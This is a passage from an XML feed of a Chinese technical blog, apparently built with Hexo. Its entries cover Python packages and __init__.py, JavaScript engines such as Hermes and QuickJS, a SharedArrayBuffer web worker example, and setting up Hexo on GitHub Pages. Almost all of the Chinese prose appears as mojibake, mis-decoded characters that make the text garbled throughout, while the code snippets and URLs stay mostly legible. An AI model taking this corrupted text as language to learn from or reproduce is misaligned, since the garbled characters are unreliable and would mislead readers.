è½½æ¨¡å—ä¹‹å‰ï¼ŒæŠŠæ¨¡å—ä»sys.modulesé‡Œé¢åˆ é™¤å³å¯ã€‚ del sys.modules[â€˜toolsâ€™]import(â€˜toolsâ€™) Python åŒ… ä¸ºäº†å¸®åŠ©ç»„ç»‡æ¨¡å—å¹¶æä¾›åç§°å±‚æ¬¡ç»“æ„ï¼ŒPython è¿˜å¼•å…¥äº†åŒ…çš„æ¦‚å¿µã€‚å¯ä»¥æŠŠåŒ…çœ‹æˆæ˜¯æ–‡ä»¶ç³»ç»Ÿä¸­çš„ç›®å½•ï¼Œå¹¶æŠŠæ¨¡å—çœ‹æˆæ˜¯ç›®å½•ä¸­çš„æ–‡ä»¶ï¼Œä½†è¯·ä¸è¦å¯¹è¿™ä¸ªç±»ä¼¼åšè¿‡äºå­—é¢çš„ç†è§£ï¼Œå› ä¸ºåŒ…å’Œæ¨¡å—ä¸æ˜¯å¿…é¡»æ¥è‡ªäºæ–‡ä»¶ç³»ç»Ÿã€‚ ä¸æ–‡ä»¶ç³»ç»Ÿä¸€æ ·ï¼ŒåŒ…é€šè¿‡å±‚æ¬¡ç»“æ„è¿›è¡Œç»„ç»‡ï¼Œåœ¨åŒ…ä¹‹å†…é™¤äº†ä¸€èˆ¬çš„æ¨¡å—ï¼Œè¿˜å¯ä»¥æœ‰å­åŒ…ã€‚ ç®€å•åœ°æ¥è¯´ï¼Œâ€åŒ…â€œ (package) æ˜¯å«æœ‰ Python æ¨¡å—çš„æ–‡ä»¶å¤¹ï¼Œä¸è¿‡å‰ææ¡ä»¶æ˜¯è¿™ä¸ªæ–‡ä»¶å¤¹ä¸‹å¿…é¡»å­˜åœ¨ __init__.py æ–‡ä»¶ã€‚ ä»€ä¹ˆæ˜¯ __init__.py æ–‡ä»¶å½“æ–‡ä»¶å¤¹ä¸‹å­˜åœ¨ __init__.py æ–‡ä»¶æ—¶æ„å‘³ç€è¯¥æ–‡ä»¶å¤¹æ˜¯ä¸€ä¸ªåŒ…ï¼Œ__init__.py æ–‡ä»¶ç”¨äºç»„ç»‡åŒ…ï¼Œç®¡ç†å„ä¸ªæ¨¡å—ä¹‹é—´çš„å¼•ç”¨ã€æ§åˆ¶åŒ…çš„å¯¼å…¥è¡Œä¸ºã€‚ å°è£…åŒ…æ—¶ç¡®ä¿æ¯ä¸ªç›®å½•éƒ½å®šä¹‰äº†ä¸€ä¸ª __init__.py æ–‡ä»¶ï¼Œä¸¾ä¸ªğŸŒ°ï¼š 123456789â”œâ”€â”€ package # é¡¶å±‚ç›®å½•â”œâ”€â”€ init.py â”œâ”€â”€ subPackage1 # å­åŒ… â”‚ â”œâ”€â”€ init.py â”‚ â”œâ”€â”€ module1 â”‚ â”œâ”€â”€ module1 â”œâ”€â”€ subPackage2 # å­åŒ… â”‚ â”œâ”€â”€ init.py â”‚ â”œâ”€â”€ module2 ç»„ç»‡å¥½ç›®å½•ç»“æ„å’Œä»£ç åï¼Œä¾¿å¯ä»¥æ‰§è¡Œä»¥ä¸‹ import è¯­å¥ï¼š 123import package.subPackage1.module1from package.subPackage1 import module1import package.subPackage2.module2 as module2 __init__.py æ–‡ä»¶çš„ç›®çš„æ˜¯è¦åŒ…å«ä¸åŒè¿è¡Œçº§åˆ«çš„åŒ…çš„å¯é€‰çš„åˆå§‹åŒ–ä»£ç ï¼Œå¯¼å…¥ä¸€ä¸ªåŒ…æ—¶ä¼šå…ˆå¯¼å…¥çš„å®ƒçš„ __init__.py æ–‡ä»¶å¹¶è‡ªåŠ¨è¿è¡Œã€‚ ä¸¾ä¸ªğŸŒ°ï¼Œæ‰§è¡Œè¯­å¥ import package.subPackage1.module1 æ—¶ï¼Œæ–‡ä»¶ package/__init__.py å°†è¢«å¯¼å…¥ï¼Œå»ºç«‹ package å‘½åç©ºé—´çš„å†…å®¹ï¼Œä¸” package/__init__.py å°†åœ¨æ–‡ä»¶ package/subPackage1/__init__.py å¯¼å…¥ä¹‹å‰å¯¼å…¥ã€‚ ä¸€èˆ¬æƒ…å†µä¸‹ __init__.py æ–‡ä»¶å¯ä»¥ä¸ºç©ºï¼Œä½†æ˜¯æœ‰çš„æ—¶å€™ä¹Ÿå¯ä»¥åœ¨ __init__.py ä¸­å¯¼å…¥å…¶ä»–çš„åŒ…æˆ–æ¨¡å—ï¼š 12# package/subPackage1/__init__.pyfrom . import module1 äºæ˜¯å°±å¯ä»¥é€šè¿‡ import package.subPackage1 ä»£æ›¿ import package.subPackage1.module1 æ¥å¯¼å…¥æ¨¡å—äº†ã€‚ åŒ…å¯¼å…¥ä½¿ç”¨ç›¸å¯¹è·¯å¾„åå¯¼å…¥åŒ…ä¸­å­æ¨¡å—å‚è€ƒæ–‡æ¡£ ã€å®˜æ–¹æ–‡æ¡£ã€‘â€” å¯¼å…¥ç³»ç»Ÿ Python _init_.py ä½œç”¨è¯¦è§£ Pythonæºç å‰–æç¬”è®°3-Pythonæ‰§è¡ŒåŸç†åˆæ¢]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Node.js ä¼ é€é—¨]]></title>
    <url>%2F2019%2F09%2F01%2FNode.js%2FNode.js%20%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99%E4%BC%A0%E9%80%81%E9%97%A8%2F</url>
    <content type="text"><![CDATA[å¦‚ä½•å­¦ä¹  Node.js ã€çŸ¥ä¹Liveã€‘ç‹¼å”ï¼šå¦‚ä½•æ­£ç¡®çš„å­¦ä¹ Node.js]]></content>
      <categories>
        <category>Node.js</category>
      </categories>
      <tags>
        <tag>Node.js</tag>
      </tags>
  </entry>
  <entry>
    <title></title>
    <url>%2F2019%2F08%2F21%2FPython%2Fpandas%20%E7%9A%84%20excel%20%E5%BA%94%E7%94%A8%2F</url>
    <content type="text"><![CDATA[ç”¨ python åšæ•°æ®åˆ†æï¼špandas çš„ excel åº”ç”¨åˆæ¢ï¼šhttps://zhuanlan.zhihu.com/p/32338530 Pythonå®ç°EXCELå¸¸ç”¨æ“ä½œâ€”â€”pandasç®€ä»‹ï¼šhttps://zhuanlan.zhihu.com/p/34541791 XlsxWriterï¼šhttps://xlsxwriter.readthedocs.io/ python å’Œ node.js äº¤äº’(node.jsä¸­æ‰§è¡Œpythonå‡½æ•°)ï¼šhttps://blog.csdn.net/qq_23057645/article/details/80967657]]></content>
  </entry>
  <entry>
    <title><![CDATA[js å¼•æ“ï¼ˆä¸€ï¼‰]]></title>
    <url>%2F2019%2F08%2F18%2FWeb%E5%89%8D%E7%AB%AF%2Fjs%20%E5%BC%95%E6%93%8E%E7%B3%BB%E5%88%97%EF%BC%88%E4%B8%80%EF%BC%89%2F</url>
    <content type="text"><![CDATA[åœ¨ Facebook å‘å¸ƒ Hermes å¼•æ“ä¹‹å‰ï¼ŒFabrice Bellard ä»¥åŠ C è¯­è¨€ä¸“å®¶ Charlie Gordon å…¬å¼€å‘å¸ƒäº† QuickJSã€‚ Facebookå‘å¸ƒå…¨æ–°JSå¼•æ“ï¼ä¸“æ³¨æé«˜React Nativeåº”ç”¨çš„æ€§èƒ½ ä¸ºäº†æé«˜ Facebook åº”ç”¨çš„æ€§èƒ½ï¼Œæˆ‘ä»¬çš„å›¢é˜Ÿä¸æ–­æ”¹è¿›è‡ªå·±çš„ JavaScript ä»£ç å’Œå¹³å°ã€‚åœ¨åˆ†ææ€§èƒ½æ•°æ®æ—¶ï¼Œæˆ‘ä»¬å‘ç° JavaScript å¼•æ“æœ¬èº«æ˜¯å½±å“å¯åŠ¨æ€§èƒ½å’Œåº”ç”¨åŒ…ä½“ç§¯çš„é‡è¦å› ç´ ã€‚æœ‰äº†è¿™äº›æ•°æ®ï¼Œæˆ‘ä»¬æ„è¯†åˆ°å¿…é¡»åœ¨æ¯” PC ç«¯é™åˆ¶æ›´å¤šçš„ç§»åŠ¨ç¯å¢ƒä¸­ä¼˜åŒ– JavaScript æ€§èƒ½ã€‚å°è¯•äº†å„ç§æ–¹æ¡ˆåï¼Œæˆ‘ä»¬æ„å»ºäº†ä¸€ä¸ªæ–°çš„ JavaScript å¼•æ“ï¼šHermesã€‚å®ƒæ—¨åœ¨æé«˜åº”ç”¨æ€§èƒ½ï¼Œä¸“æ³¨äº React Native åº”ç”¨ï¼Œå¹¶ä¸”åœ¨å¸‚é¢ä¸Šé‚£äº›å†…å­˜è¾ƒå°‘ã€å­˜å‚¨é€Ÿåº¦è¾ƒæ…¢ä¸”è®¡ç®—èƒ½åŠ›ä½ä¸‹çš„ç§»åŠ¨è®¾å¤‡ä¸Šéƒ½æœ‰è‰¯å¥½çš„è¡¨ç°ã€‚ ä¸»è¦ç‰¹ç‚¹ï¼š å­—èŠ‚ç é¢„ç¼–è¯‘ æ—  JIT åƒåœ¾å›æ”¶ç­–ç•¥ è½»é‡å¯åµŒå…¥çš„QuickJSå¼•æ“é‡ç£…å¼€æºï¼Œå®ƒä¼šæ˜¯ä¸‹ä¸€ä¸ªV8å—ï¼Ÿ ä¸€è·¯å¼€æŒ‚çš„ä½œè€… Fabrice Bellard æ˜¯ä¸€ä½æ³•å›½è‘—åçš„è®¡ç®—æœºç¨‹åºå‘˜ï¼Œå›  FFmpegã€QEMU ç­‰é¡¹ç›®è€Œé—»åä¸šå†…ã€‚ä»–ä¹Ÿæ˜¯æœ€å¿«åœ†å‘¨ç‡ç®—æ³•è´æ‹‰å…¬å¼ã€TCCBOOT å’Œ TCC ç­‰é¡¹ç›®çš„ä½œè€…ã€‚ QuickJS æ”¯æŒ ES2019 è§„èŒƒï¼ŒåŒ…æ‹¬æ¨¡å—ï¼Œå¼‚æ­¥ç”Ÿæˆå™¨å’Œä»£ç†ï¼Œä¸»è¦ç‰¹ç‚¹ï¼š å°å·§ä¸”æ˜“äºåµŒå…¥ï¼šåªéœ€å‡ ä¸ª C æ–‡ä»¶ï¼Œæ— å¤–éƒ¨ä¾èµ–ï¼Œx86 ä¸‹ä¸€ä¸ªç®€å•çš„ hello world ç¤ºä¾‹ç¨‹åºä»… 190 KB çš„å¤§å°ã€‚ å…·æœ‰æä½å¯åŠ¨æ—¶é—´çš„å¿«é€Ÿè§£é‡Šå™¨ï¼šåœ¨å°å¼ PC çš„å•æ ¸ä¸Šï¼Œåœ¨å¤§çº¦ 100 ç§’å†…è¿è¡Œ ECMAScript æµ‹è¯•å¥—ä»¶56000 æ¬¡æµ‹è¯•ã€‚è¿è¡Œæ—¶å®ä¾‹çš„å®Œæ•´ç”Ÿå‘½å‘¨æœŸåœ¨ä¸åˆ° 300 å¾®ç§’çš„æ—¶é—´å†…å®Œæˆã€‚ æ”¯æŒ ES2019 ï¼ŒåŒ…æ‹¬æ¨¡å—ã€å¼‚æ­¥ç”Ÿæˆå™¨å’Œå®Œæ•´çš„ Annex B æ”¯æŒï¼ˆä¼ ç»Ÿçš„ Web å…¼å®¹æ€§ï¼‰ã€‚ 100ï¼…çš„é€šè¿‡äº† ECMAScript æµ‹è¯•ç”¨ä¾‹ã€‚ å¯ä»¥å°† Javascript æºç¼–è¯‘ä¸ºæ²¡æœ‰å¤–éƒ¨ä¾èµ–çš„å¯æ‰§è¡Œæ–‡ä»¶ã€‚ ä½¿ç”¨å¼•ç”¨è®¡æ•°ï¼ˆä»¥å‡å°‘å†…å­˜ä½¿ç”¨å¹¶å…·æœ‰ç¡®å®šæ€§è¡Œä¸ºï¼‰çš„åƒåœ¾æ”¶é›†ä¸å¾ªç¯åˆ é™¤ã€‚ æ•°å­¦æ‰©å±•ï¼šBigIntï¼ŒBigFloatï¼Œè¿ç®—ç¬¦é‡è½½ï¼Œbigint æ¨¡å¼ï¼Œæ•°å­¦æ¨¡å¼ã€‚ åœ¨ Javascript ä¸­å®ç°çš„å…·æœ‰ä¸Šä¸‹æ–‡ç€è‰²çš„å‘½ä»¤è¡Œè§£é‡Šå™¨ã€‚ å¸¦æœ‰ C åº“åŒ…è£…åº“æ„å»ºçš„å†…ç½®æ ‡å‡†åº“ã€‚ PS: å‰ç«¯æ€§èƒ½ä¼˜åŒ–ç»ˆäºèµ°åˆ°äº† js å¼•æ“çš„å±‚é¢ã€‚ä¸ºäº†æ›´å¥½åœ°åœ°äº†è§£å¼•æ“æŠ€æœ¯ï¼Œæˆ‘ä»¬å…ˆæ¥æ¸©æ•…ä¸€ä¸‹ js åŸºç¡€æœºåˆ¶ï¼šå¼€å‘åšäº†è¿™ä¹ˆå¤šå¹´ï¼Œä½ çœŸçš„äº†è§£JSå·¥ä½œæœºåˆ¶å—ï¼Ÿ JIT å°† JS è§†ä¸ºä¸€ç§è§£é‡Šæ€§è¯­è¨€æ˜¯ä¸å¯¹çš„ã€‚ä»¥å‰å¾ˆå¤šå¹´ JS çš„ç¡®æ˜¯è§£é‡Šæ€§çš„ï¼Œä½†æœ€è¿‘å‡ºç°äº†ä¸€äº›å˜åŒ–ï¼Œè¿™ç§å‡è®¾ä¹Ÿéšä¹‹è¿‡æ—¶äº†ã€‚è®¸å¤šæµè¡Œçš„ JS å¼•æ“ä¸ºäº†ä½¿ JS æ‰§è¡Œæ›´å¿«ï¼Œå¼•å…¥äº†ä¸€ç§ç§°ä¸º Just-In-Time ç¼–è¯‘çš„åŠŸèƒ½ã€‚ç®€è€Œè¨€ä¹‹ï¼Œè¿™æ„å‘³ç€ JS ä»£ç ä¼šåœ¨æ‰§è¡ŒæœŸé—´ç›´æ¥ç¼–è¯‘æˆæœºå™¨ç ï¼ˆè‡³å°‘ V8 æ˜¯è¿™æ ·åšçš„ï¼‰ï¼Œä¸å†æœ‰è§£é‡Šè¿™ä¸€æ­¥ã€‚è¿™ä¸ªæµç¨‹è€—æ—¶ç¨é•¿ï¼Œä½†è¾“å‡ºçš„ç»“æœæ€§èƒ½æ›´å¼ºã€‚ä¸ºäº†åœ¨æœ‰é™çš„æ—¶é—´å†…å®Œæˆå·¥ä½œï¼ŒV8 å®é™…ä¸Šæœ‰ä¸¤ä¸ªç¼–è¯‘å™¨ï¼ˆä¸ç®—ä¸ WebAssembly ç›¸å…³çš„å†…å®¹ï¼‰ã€‚å…¶ä¸­ä¸€ä¸ªæ˜¯é€šç”¨çš„ï¼Œèƒ½å¤Ÿéå¸¸å¿«åœ°ç¼–è¯‘ä»»ä½• JS ä»£ç ï¼Œä½†åªè¾“å‡ºæ€§èƒ½ä¸€èˆ¬çš„ç»“æœï¼›è€Œå¦ä¸€ä¸ªç¼–è¯‘é€Ÿåº¦æœ‰ç‚¹æ…¢ï¼Œæ˜¯ç”¨æ¥ç¼–è¯‘å¸¸ç”¨ä»£ç çš„ï¼Œå…¶è¾“å‡ºç»“æœæ€§èƒ½æé«˜ã€‚å½“ç„¶ï¼Œå› ä¸º JS æœ‰åŠ¨æ€ç±»å‹çš„ç‰¹æ€§ï¼Œè¿™äº›ç¼–è¯‘å™¨ä¹Ÿä¸å¥½åšã€‚æ‰€ä»¥ç±»å‹ä¸å˜çš„æƒ…å†µä¸‹ç¬¬äºŒä¸ªç¼–è¯‘å™¨çš„æ•ˆæœæœ€å¥½ï¼Œèƒ½è®©ä½ çš„ä»£ç è¿è¡Œèµ·æ¥å¿«å¾—å¤šã€‚ å †å’Œæ ˆ åœ¨ JS ä»£ç çš„æ‰§è¡Œè¿‡ç¨‹ä¸­ä¼šåˆ†é…ä¸¤ä¸ªå†…å­˜åŒºåŸŸâ€”â€”è°ƒç”¨æ ˆå’Œ å †ã€‚ç¬¬ä¸€ä¸ªæ€§èƒ½éå¸¸é«˜ï¼Œå› æ­¤ç”¨äºè¿ç»­æ‰§è¡Œæ‰€æä¾›çš„å‡½æ•°ã€‚æ¯ä¸ªå‡½æ•°è°ƒç”¨åœ¨è°ƒç”¨æ ˆä¸­åˆ›å»ºä¸€ä¸ªæ‰€è°“çš„â€œæ¡†æ¶â€ï¼Œå…¶ä¸­åŒ…å«å…¶å±€éƒ¨å˜é‡çš„å‰¯æœ¬å’Œ thisã€‚ä½ å¯ä»¥é€šè¿‡ Chrome è°ƒè¯•å™¨æŸ¥çœ‹å®ƒã€‚å°±åƒåœ¨å…¶ä»–ä¸å †æ ˆç±»ä¼¼çš„æ•°æ®ç»“æ„ä¸­ä¸€æ ·ï¼Œè°ƒç”¨æ ˆçš„å¸§è¢«æ¨é€æˆ–å¼¹å‡ºå †æ ˆï¼Œå…·ä½“å–å†³äºæ­£åœ¨æ‰§è¡Œæˆ–ç»ˆæ­¢çš„æ–°å‡½æ•°ã€‚ä½ å¯èƒ½è§è¿‡è°ƒç”¨æ ˆä¸Šé™æº¢å‡ºé”™è¯¯ï¼Œé€šå¸¸æ˜¯ç”±äºæŸç§å½¢å¼çš„æ— é™å¾ªç¯å¯¼è‡´çš„ã€‚ è°ˆåˆ°å †ï¼Œå°±åƒç°å®ç”Ÿæ´»ä¸­ä¸€æ ·ï¼ŒJS å †æ˜¯å­˜å‚¨æœ¬åœ°èŒƒå›´ä¹‹å¤–å¯¹è±¡çš„åœ°æ–¹ã€‚å®ƒæ¯”è°ƒç”¨æ ˆæ…¢å¾—å¤šã€‚è¿™å°±æ˜¯ä¸ºä»€ä¹ˆè®¿é—®æœ¬åœ°å˜é‡æ—¶é€Ÿåº¦å¯èƒ½ä¼šå¿«å¾ˆå¤šã€‚å †ä¹Ÿæ˜¯å­˜æ”¾æœªè¢«è®¿é—®æˆ–ä½¿ç”¨çš„å¯¹è±¡çš„åœ°æ–¹ï¼Œè¿™ç§å¯¹è±¡å°±æ˜¯åƒåœ¾ã€‚æœ‰åƒåœ¾å°±è¦æœ‰åƒåœ¾å›æ”¶å™¨ã€‚éœ€è¦æ—¶ JS è¿è¡Œæ—¶çš„åƒåœ¾å›æ”¶å™¨å°±ä¼šæ¿€æ´»ï¼Œæ¸…ç†å †å¹¶é‡Šæ”¾å†…å­˜ã€‚ å‰ç«¯å†…å­˜ç›¸å…³æ¢ç´¢ å †å’Œæ ˆ åœ¨å‰ç«¯ä¸­ï¼Œè¢«å­˜å‚¨åœ¨æ ˆå†…çš„æ•°æ®åŒ…æ‹¬å°æ•°å€¼å‹ï¼Œstring ï¼Œboolean å’Œå¤æ‚ç±»å‹çš„åœ°å€ç´¢å¼•ã€‚æ‰€è°“å°æ•°å€¼æ•°æ®(small number), å³é•¿åº¦çŸ­äº 32 ä½å­˜å‚¨ç©ºé—´çš„ number å‹æ•°æ®ã€‚ä¸€äº›å¤æ‚çš„æ•°æ®ç±»å‹ï¼Œè¯¸å¦‚ Arrayï¼ŒObject ç­‰ï¼Œæ˜¯è¢«å­˜åœ¨å †ä¸­çš„ã€‚ å…±äº«å†…å­˜ å½“ç¨‹åºå˜çš„è¿‡äºå¤æ‚æ—¶ï¼Œæˆ‘ä»¬å¸Œæœ›é€šè¿‡ webworker æ¥å¼€å¯æ–°çš„ç‹¬ç«‹çº¿ç¨‹ï¼Œå®Œæˆç‹¬ç«‹è®¡ç®—ã€‚ å¼€å¯æ–°çš„çº¿ç¨‹ä¼´éšè€Œæ¥çš„é—®é¢˜å°±æ˜¯é€šè®¯é—®é¢˜ã€‚webworker çš„ postMessage å¯ä»¥å¸®åŠ©æˆ‘ä»¬å®Œæˆé€šä¿¡ï¼Œä½†æ˜¯è¿™ç§é€šä¿¡æœºåˆ¶æ˜¯å°†æ•°æ®ä»ä¸€éƒ¨åˆ†å†…å­˜ç©ºé—´å¤åˆ¶åˆ°ä¸»çº¿ç¨‹çš„å†…å­˜ä¸‹ã€‚è¿™ä¸ªèµ‹å€¼è¿‡ç¨‹å°±ä¼šé€ æˆæ€§èƒ½çš„æ¶ˆè€—ã€‚ è€Œå…±äº«å†…å­˜ï¼Œé¡¾åæ€ä¹‰ï¼Œå¯ä»¥è®©æˆ‘ä»¬åœ¨ä¸åŒçš„çº¿ç¨‹é—´ï¼Œå…±äº«ä¸€å—å†…å­˜ï¼Œè¿™äº›ç°æˆéƒ½å¯ä»¥å¯¹å†…å­˜è¿›è¡Œæ“ä½œï¼Œä¹Ÿå¯ä»¥è¯»å–è¿™å—å†…å­˜ã€‚çœå»äº†èµ‹å€¼æ•°æ®çš„è¿‡ç¨‹ï¼Œä¸è¨€è€Œå–»ï¼Œæ•´ä¸ªæ€§èƒ½ä¼šæœ‰è¾ƒå¤§å¹…åº¦çš„æå‡ã€‚ ä½¿ç”¨åŸå§‹çš„ postMessage æ–¹æ³•è¿›è¡Œæ•°æ®ä¼ è¾“ä½¿ç”¨ï¼Œæ¯ä¸€ä¸ªæ¶ˆæ¯å†…çš„æ•°æ®åœ¨ä¸åŒçš„çº¿ç¨‹ä¸­ï¼Œéƒ½æ˜¯è¢«å…‹éš†ä¸€ä»½ä»¥åå†ä¼ è¾“çš„ã€‚æ•°æ®é‡è¶Šå¤§ï¼Œæ•°æ®ä¼ è¾“é€Ÿåº¦è¶Šæ…¢ã€‚ sharedBufferArray çš„æ¶ˆæ¯ä¼ é€’é€šè¿‡å…±äº«å†…å­˜ä¼ é€’çš„æ•°æ®ï¼Œåœ¨ worker ä¸­æ”¹å˜äº†æ•°æ®ä»¥åï¼Œä¸»çº¿ç¨‹çš„åŸå§‹æ•°æ®ä¹Ÿè¢«æ”¹å˜äº†ã€‚ main.js 1234567891011121314151617181920var worker = new Worker(&apos;./sharedArrayBufferWorker.js&apos;);worker.onmessage = function(e)&#123; // ä¼ å›åˆ°ä¸»çº¿ç¨‹å·²ç»è¢«è®¡ç®—è¿‡çš„æ•°æ® console.log(&quot;e.data&quot;,&quot; -- &quot;, e.data ); // SharedArrayBuffer(3) &#123;&#125; // å’Œä¼ ç»Ÿçš„ postMessage æ–¹å¼å¯¹æ¯”ï¼Œå‘ç°ä¸»çº¿ç¨‹çš„åŸå§‹æ•°æ®å‘ç”Ÿäº†æ”¹å˜ console.log(&quot;int8Array-outer&quot;,&quot; -- &quot;, int8Array ); // Int8Array(3) [2, 3, 4]&#125;;var sharedArrayBuffer = new SharedArrayBuffer(3);var int8Array = new Int8Array(sharedArrayBuffer);int8Array[0] = 1;int8Array[1] = 2;int8Array[2] = 3;worker.postMessage(sharedArrayBuffer); worker.js 12345678910111213onmessage = function(e)&#123; var arrayData = increaseData(e.data); postMessage(arrayData);&#125;;function increaseData(arrayData)&#123; var int8Array = new Int8Array(arrayData); for(let i = 0; i &lt; int8Array.length; i++)&#123; int8Array[i] += 1; &#125; return arrayData;&#125; å‰ç«¯ Web Workers åˆ°åº•æ˜¯ä»€ä¹ˆï¼Ÿ workerçº¿ç¨‹çš„ä½¿ç”¨æœ‰ä¸€äº›æ³¨æ„ç‚¹ åŒæºé™åˆ¶ workerçº¿ç¨‹æ‰§è¡Œçš„è„šæœ¬æ–‡ä»¶å¿…é¡»å’Œä¸»çº¿ç¨‹çš„è„šæœ¬æ–‡ä»¶åŒæºï¼Œè¿™æ˜¯å½“ç„¶çš„äº†ï¼Œæ€»ä¸èƒ½å…è®¸workerçº¿ç¨‹åˆ°åˆ«äººç”µè„‘ä¸Šåˆ°å¤„è¯»æ–‡ä»¶å§ æ–‡ä»¶é™åˆ¶ ä¸ºäº†å®‰å…¨ï¼Œworkerçº¿ç¨‹æ— æ³•è¯»å–æœ¬åœ°æ–‡ä»¶ï¼Œå®ƒæ‰€åŠ è½½çš„è„šæœ¬å¿…é¡»æ¥è‡ªç½‘ç»œï¼Œä¸”éœ€è¦ä¸ä¸»çº¿ç¨‹çš„è„šæœ¬åŒæº DOMæ“ä½œé™åˆ¶ workerçº¿ç¨‹åœ¨ä¸ä¸»çº¿ç¨‹çš„windowä¸åŒçš„å¦ä¸€ä¸ªå…¨å±€ä¸Šä¸‹æ–‡ä¸­è¿è¡Œï¼Œå…¶ä¸­æ— æ³•è¯»å–ä¸»çº¿ç¨‹æ‰€åœ¨ç½‘é¡µçš„DOMå¯¹è±¡ï¼Œä¹Ÿä¸èƒ½è·å– documentã€ windowç­‰å¯¹è±¡ï¼Œä½†æ˜¯å¯ä»¥è·å– navigatorã€ location(åªè¯»)ã€XMLHttpRequestã€ setTimeoutæ—ç­‰æµè§ˆå™¨APIã€‚ é€šä¿¡é™åˆ¶ workerçº¿ç¨‹ä¸ä¸»çº¿ç¨‹ä¸åœ¨åŒä¸€ä¸ªä¸Šä¸‹æ–‡ï¼Œä¸èƒ½ç›´æ¥é€šä¿¡ï¼Œéœ€è¦é€šè¿‡ postMessageæ–¹æ³•æ¥é€šä¿¡ã€‚ è„šæœ¬é™åˆ¶ workerçº¿ç¨‹ä¸èƒ½æ‰§è¡Œ alertã€ confirmï¼Œä½†å¯ä»¥ä½¿ç”¨ XMLHttpRequest å¯¹è±¡å‘å‡ºajaxè¯·æ±‚ã€‚ æ¼«è°ˆå‰ç«¯æ€§èƒ½ çªç ´ React åº”ç”¨ç“¶é¢ˆ React ç»“åˆ Web worker ? å°è¯•åœ¨ Web worker ä¸­è¿è¡Œ React Virtual DOM çš„ç›¸å…³è®¡ç®—ï¼Œå³å°† React core éƒ¨åˆ†ç§»å…¥ Web worker çº¿ç¨‹ä¸­ ? è¿˜çœŸæœ‰äººæå‡ºç±»ä¼¼æƒ³æ³•ï¼š3092 issueï¼Œä½†æ˜¯ææ¡ˆè¢«æ‹’ç»äº†ï¼Œreact é€‰æ‹©çš„æ˜¯ React Fiberã€‚ ä½†æ˜¯è¿™ä¸ªå¹¶ä¸å¦¨ç¢ Web worker æˆä¸º â€œæ°‘é—´â€ çš„ react æ€§èƒ½è§£è¯ï¼š React Redux ä¸­é—´ä»¶æ€æƒ³é‡è§ Web Worker çš„çµæ„Ÿï¼ˆé™„demoï¼‰å¦å¤–ä¸¾ä¸ªä¾‹å­å¯¹æ¯”: http://web-perf.github.io/react-worker-dom/]]></content>
      <categories>
        <category>Webå‰ç«¯</category>
      </categories>
      <tags>
        <tag>Webå‰ç«¯</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[hexo & github page æ­å»ºåšå®¢]]></title>
    <url>%2F2019%2F08%2F17%2F%E5%85%B6%E4%BB%96%2Fhexo%20%26%20github%20page%20%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%2F</url>
    <content type="text"><![CDATA[æ­å»ºæ­å»ºè¿‡ç¨‹å‚è€ƒè¿™ç¯‡æ–‡ç« ï¼šæ‰‹æŠŠæ‰‹æ•™ä½ ä½¿ç”¨ Hexo + Github Pages æ­å»ºä¸ªäººç‹¬ç«‹åšå®¢ Hexo ä¸»é¢˜é…ç½®å»ºè®®è®¾ç½®ä¸º next ä¸»é¢˜ å…‹éš†ä»“åº“ 12// git cloneå‘½ä»¤å°†Nextä»“åº“å…‹éš†åˆ°hexoç›®å½•ä¸‹çš„themes/nextgit clone https://github.com/theme-next/hexo-theme-next.git themes/next è®¾ç½® Next ä¸»é¢˜ 12345// åœ¨ç«™ç‚¹æ ¹ç›®å½•ä¸‹ï¼Œè®¾ç½®ä»¥ä¸‹ä»£ç ï¼š# Extensions## Plugins: https://hexo.io/plugins/## Themes: https://hexo.io/themes/theme: hexo-theme-next #æ­¤å¤„å¡«å…¥ä½ åœ¨themesç›®å½•ä¸‹çš„nextä¸»é¢˜æ–‡ä»¶å ä¸ªæ€§åŒ–è®¾ç½®å¤§è‡´è®¾ç½®è¿‡ç¨‹å‚è§è¿™ç¯‡æ–‡ç« ï¼š Hexo æ­å»ºçš„ GitHub åšå®¢ä¹‹ä¼˜åŒ–å¤§å…¨ å¼€å¯æ–‡ç« é˜…è¯»æ¬¡æ•°åŠŸèƒ½ ç¬¬ä¸€ç§æ–¹æ³•ï¼šLeanCloud (å‚è€ƒè¿™ç¯‡æ–‡ç« ï¼šhttps://www.jianshu.com/p/702a7aec4d00) å» LeanCloud ï¼Œåˆ›å»ºæ–°åº”ç”¨ï¼Œåˆ›å»º Counter ç±» ä¿®æ”¹ä¸»é¢˜æ–‡ä»¶ 1234leancloud_visitors: enable: true #å°†åŸæ¥çš„falseæ”¹ä¸ºtrue app_id: #&lt;app_id&gt; app_key: #&lt;app_key&gt; ç¬¬äºŒç§æ–¹æ³•ï¼š å¼€å¯ä¸è’œå­ç»Ÿè®¡åŠŸèƒ½ åœ¨ä¸»é¢˜é…ç½®æ–‡ä»¶ä¸­ _config.yml ï¼š 1234567891011121314# Show Views/Visitors of the website/page with busuanzi.# Get more information on http://ibruce.info/2015/04/04/busuanzi/busuanzi_count: enable: true site_uv: true #total visitors site_uv_icon: #user-circle site_uv_header: ä½ æ˜¯æ¥è®¿çš„ç¬¬ site_uv_footer: ä½å°ä¼™ä¼´ site_pv: false #total views site_pv_icon: eye site_pv_header: è®¿é—®æ¬¡æ•°ï¼š site_pv_footer: æ¬¡ post_views: false post_views_icon: eye ä¸è¿‡å› ä¸ºåŸŸåè¿‡æœŸé—®é¢˜ï¼Œnext é»˜è®¤é›†æˆçš„ valine è„šæœ¬æ— æ³•è®¿é—®ï¼Œè§£å†³åŠæ³•å‚è§ï¼šhexo åšå®¢è§£å†³ä¸è’œå­ç»Ÿè®¡æ— æ³•æ˜¾ç¤ºé—®é¢˜ å¼€å¯ valine è¯„è®ºåŠŸèƒ½å¤§è‡´è®¾ç½®è¿‡ç¨‹å‚è€ƒè¿™ç¯‡æ–‡ç« ï¼š Hexo åšå®¢ä½¿ç”¨ valine è¯„è®ºç³»ç»Ÿæ— æ•ˆæœåŠç»ˆæè§£å†³æ–¹æ¡ˆ éœ€è¦ç‰¹åˆ«æ³¨æ„çš„æ˜¯ï¼š valine è¯„è®ºå’Œæ–‡ç« é˜…è¯»æ¬¡æ•°åŠŸèƒ½å‡åŸºäº 